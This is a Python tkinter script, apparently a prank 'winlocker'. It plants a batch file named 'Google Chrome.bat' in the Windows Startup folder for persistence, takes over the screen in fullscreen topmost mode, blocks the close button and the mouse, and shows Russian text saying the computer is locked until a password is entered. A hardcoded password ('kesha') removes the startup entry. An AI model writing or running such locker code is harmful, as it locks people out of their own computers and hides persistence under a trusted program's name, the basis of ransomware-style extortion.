from tkinter import *
from playsound import *
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui


def skam_1():
    USER_NAME = getpass.getuser()

    window_6 = Tk()
    window_6.title("Хакер мен)")
    window_6.geometry("400x200")
    window_6["bg"] = "black"

    normal_width = 1920
    normal_height = 1080

    screen_width = window_6.winfo_screenwidth()
    screen_height = window_6.winfo_screenheight()

    percentage_width = screen_width / (normal_width / 100)
    percentage_height = screen_height / (normal_height / 100)

    scale_factor = ((percentage_width + percentage_height) / 2) / 100

    fontsize = int(20 * scale_factor)
    minimum_size = 10
    if fontsize < minimum_size:
        fontsize = minimum_size

    fontsizeHding = int(72 * scale_factor)
    minimum_size = 40
    if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size

    default_style = ttk.Style()
    default_style.configure('New.TButton', font=("Helvetica", fontsize))

    def play(test):
        playsound("Lololowka_-_-_GIMN_SIYANIYA_Idealnyjj_Mir_75103964.mp3", False)

    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    def block():
        pyautogui.moveTo(x=680, y=800)
        window_6.protocol("WM_DELETE_WINDOW", block)
        window_6.update()

    def fullscreen():
        window_6.attributes('-fullscreen', True, '-topmost', True)

    def clicked():
        res = format(txt.get())
        if res == 'kesha':
            file_path = '/tmp/file.txt'
            file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
            os.remove(file_path)
            sys.exit()

    add_to_startup("C:\\myFiles\\main.py")
    fullscreen()

    txt_one = Label(window_6, text="ГДЕ КЕША???", font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_two = Label(window_6, text="НАМ НУЖЕН КЕША", font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_three = Label(window_6, text='''Ваш компьютер был заблокирован винлокером. Пожалуйста, введите пароль для получения доступа к компьютеру!
                         Я ЖЕ ПРЕДУПРЕЖДАЛ!!!''', font=("Arial Bold", fontsize), fg='white', bg='black')

    txt_one.grid(column=0, row=0)
    txt_two.grid(column=0, row=0)
    txt_three.grid(column=0, row=0)

    txt_one.place(relx=.01, rely=.01)
    txt_two.place(relx=.01, rely=.11)
    txt_three.place(relx=.01, rely=.21)

    txt = Entry(window_6)
    btn = Button(window_6, text="ВВОД КОДА", command=clicked)
    txt.place(relx=.28, rely=.5, relwidth=.3, relheight=.06)
    btn.place(relx=.62, rely=.5, relwidth=.1, relheight=.06)

    # play("Lololowka_-_-_GIMN_SIYANIYA_Idealnyjj_Mir_75103964.mp3")

    block()

    window_6.mainloop()
# skam_1()
